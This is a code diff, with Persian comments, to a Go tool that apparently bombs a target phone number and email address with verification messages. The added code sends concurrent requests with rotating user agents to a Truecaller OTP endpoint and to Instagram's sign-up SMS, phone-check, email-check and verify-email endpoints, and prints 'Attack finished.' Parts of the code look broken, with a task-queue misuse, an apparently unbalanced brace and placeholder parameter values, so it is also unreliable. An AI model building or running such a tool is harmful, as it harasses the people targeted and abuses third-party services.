@@ -19,6 +19,7 @@ import (
 	"syscall"
 	"time"
 	"math/rand"
+	"regexp"
 )
 
 var userAgents = []string{
@@ -26,9 +27,6 @@ var userAgents = []string{
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
 }
 
-// =========================================================================================
-// بخش جدید: لیست پیش‌شماره کشورها برای راهنمایی
-// =========================================================================================
 var countryCodes = map[string]string{
 	"Afghanistan": "+93", "Albania": "+355", "Algeria": "+213", "American Samoa": "+1-684",
 	"Andorra": "+376", "Angola": "+244", "Argentina": "+54", "Armenia": "+374", "Australia": "+61",
@@ -132,6 +130,33 @@ func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sy
 	ch <- http.StatusInternalServerError
 }
 
+func parsePhoneNumber(fullNumber string) (string, string) {
+    // A simple regex to extract country code (e.g., be, ir, us) and the rest of the number.
+    // This is a simplified example. For full correctness, a library like libphonenumber is needed.
+    // Let's assume input is like +32484... or +98912...
+    if !strings.HasPrefix(fullNumber, "+") {
+        return "", "" // Invalid format
+    }
+
+    // A very basic map for example purposes.
+    // You can expand this map.
+    numericToAlpha := map[string]string{
+        "32": "be",
+        "98": "ir",
+        "1":  "us",
+        "44": "gb",
+    }
+    
+    // Find the country code part
+    for numCode, alphaCode := range numericToAlpha {
+        if strings.HasPrefix(fullNumber, "+"+numCode) {
+            phonePart := strings.TrimPrefix(fullNumber, "+")
+            return phonePart, alphaCode
+        }
+    }
+    
+    return "", "" // Not found in our simple map
+}
 
 func main() {
 	rand.Seed(time.Now().UnixNano())
@@ -184,20 +209,61 @@ func main() {
 		// --- وظایف مربوط به SMS (اگر شماره تلفن وارد شده باشد) ---
 		if phone != "" {
 
+	// ** API 1: Truecaller (JSON) **
+			wg.Add(1)
+			tasks <- func() {
+				phoneNum, countryCode := parsePhoneNumber(phone)
+				if phoneNum != "" && countryCode != "" {
+					payload := map[string]interface{}{
+						"phone":       phoneNum,
+						"countryCode": countryCode,
+					}
+					sendJSONRequest(client, ctx, "https://europe-west1-truecaller-web.cloudfunctions.net/webapi/eu/auth/truecaller/v1/send-otp", payload, &wg, ch)
+				}
+			}()
 
-
-
-
+			// ** API 2: Instagram Check Phone (Form) **
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("phone_number", phone)
+				formData.Set("jazoest", "21771") // مقدار نمونه
+				sendFormRequest(client, ctx, "https://www.instagram.com/api/v1/web/accounts/check_phone_number/", formData, &wg, ch)
+			}()
+			
+			// ** API 3: Instagram Send SMS (Form) **
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("client_id", "some_generated_client_id") // مقدار نمونه
+				formData.Set("phone_number", phone)
+				formData.Set("jazoest", "21771") // مقدار نمونه
+				sendFormRequest(client, ctx, "https://www.instagram.com/api/v1/web/accounts/send_signup_sms_code_ajax/", formData, &wg, ch)
+			}()
 		}
 
 		// --- وظایف مربوط به Email (اگر ایمیل وارد شده باشد) ---
 		if email != "" {
 
+// ** API 4: Instagram Check Email (Form) **
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("email", email)
+				formData.Set("jazoest", "21771") // مقدار نمونه
+				sendFormRequest(client, ctx, "https://www.instagram.com/api/v1/web/accounts/check_email/", formData, &wg, ch)
+			}()
 
-
-
-
-
+			// ** API 5: Instagram Send Verify Email (Form) **
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("device_id", "some_generated_device_id") // مقدار نمونه
+				formData.Set("email", email)
+				formData.Set("jazoest", "21771") // مقدار نمونه
+				sendFormRequest(client, ctx, "https://www.instagram.com/api/v1/accounts/send_verify_email/", formData, &wg, ch)
+			}()
+		}
 		}
 	}
 
@@ -215,7 +281,6 @@ func main() {
 		} else if statusCode > 0 { // خطاهای HTTP
 			fmt.Printf("\033[01;31m[-] Request Failed with status: %d\n", statusCode)
 		}
-		// اگر statusCode برابر با 0 (کنسل شده) یا -1 (URL خالی) بود، چیزی چاپ نمی‌کنیم
 	}
 	fmt.Println("\n\033[01;34m[*] Attack finished.\033[0m")
 }
